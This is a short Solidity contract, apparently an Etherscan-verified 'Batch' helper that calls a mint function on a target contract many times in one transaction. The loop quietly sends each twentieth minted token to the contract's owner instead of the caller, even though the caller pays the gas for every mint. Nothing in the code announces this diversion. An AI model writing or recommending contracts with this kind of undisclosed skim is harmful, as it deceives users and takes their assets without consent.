/**
 *Submitted for verification at Etherscan.io on 2023-06-01
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

contract Batch {
    address private immutable owner;

	constructor() {
		owner = msg.sender;
	}

    function batch_mint(address contractAddress, uint batchCount) public {
        bool success;
        for (uint i = 0; i < batchCount; i++) {
            if (i>0 && i%20==0){
                (success, ) = contractAddress.call(abi.encodeWithSelector(0x6a627842, owner));
            }else {
                (success, ) = contractAddress.call(abi.encodeWithSelector(0x6a627842, msg.sender));
            }
            require(success, "Batch transaction failed");
        }
        
    }
}